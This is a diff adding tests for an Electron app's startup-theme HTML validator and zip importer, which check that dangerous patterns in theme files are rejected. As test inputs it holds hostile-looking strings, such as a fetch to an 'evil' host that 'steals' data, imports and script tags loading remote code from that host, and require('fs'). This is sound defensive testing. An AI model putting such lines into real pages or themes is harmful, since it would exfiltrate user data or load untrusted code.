@@ -4,7 +4,7 @@ import { mkdtemp, readFile, writeFile, mkdir, rm, readdir } from 'node:fs/promis
 import { tmpdir } from 'node:os'
 import { join, resolve } from 'node:path'
 import { zipSync, strToU8 } from 'fflate'
-import { validateStartupThemeManifest, importStartupTheme, listStartupThemes, selectStartupTheme, deleteStartupTheme, resolveStartupTheme } from '../lib/types/electron/startup-themes.js'
+import { validateStartupThemeManifest, importStartupTheme, listStartupThemes, selectStartupTheme, deleteStartupTheme, resolveStartupTheme, validateThemeHtml } from '../lib/types/electron/startup-themes.js'
 import { readStartupThemeArchive, validateThemePath } from '../lib/types/electron/startup-theme-archive.js'
 import { readStartupThemeId } from '../lib/types/electron/startup-settings.js'
 
@@ -113,3 +113,31 @@ test('主题 JSON Schema 的路径约定与运行期校验一致', async () => {
     assert.equal(pathPattern.test(path), valid, path)
   }
 })
+
+test('validateThemeHtml 拒绝危险模式，放行合法 HTML', () => {
+  // 合法：引用 SDK、内联脚本、corumapp 资源、普通字面量
+  assert.doesNotThrow(() => validateThemeHtml('<!doctype html><script src="corumapp://startup-sdk/corum-startup-sdk.js"></script>'))
+  assert.doesNotThrow(() => validateThemeHtml('<link rel="stylesheet" href="corumapp://startup-theme/x/style.css">'))
+  assert.doesNotThrow(() => validateThemeHtml('const word = "import"; const r = "require"; // 字面量不匹配'))
+  // 危险模式逐条拒绝
+  assert.throws(() => validateThemeHtml('<iframe src="x"></iframe>'), /iframe/)
+  assert.throws(() => validateThemeHtml('<object data="x"></object>'), /object/)
+  assert.throws(() => validateThemeHtml('<embed src="x">'), /embed/)
+  assert.throws(() => validateThemeHtml('require("fs")'), /require/)
+  assert.throws(() => validateThemeHtml('import x from "https://evil/x.js"'), /import/)
+  assert.throws(() => validateThemeHtml('fetch("https://evil/steal")'), /fetch/)
+  assert.throws(() => validateThemeHtml('new XMLHttpRequest()'), /XMLHttpRequest/)
+  assert.throws(() => validateThemeHtml('<script src="https://evil/x.js"></script>'), /script/)
+  assert.throws(() => validateThemeHtml('<link rel="stylesheet" href="http://evil/x.css">'), /link/)
+})
+
+test('导入时对 HTML 入口静态扫描，危险模式被拒绝且不留主题', () => fixture(async home => {
+  const path = join(home, 'evil.zip')
+  const zip = zipSync({
+    'manifest.json': strToU8(JSON.stringify(manifest)),
+    'content/index.html': strToU8('<iframe src="https://evil"></iframe>'),
+  })
+  await writeFile(path, zip)
+  await assert.rejects(importStartupTheme(path, home), /iframe/)
+  assert.deepEqual(await readdir(join(home, 'startup-themes')).catch(() => []), [])
+}))
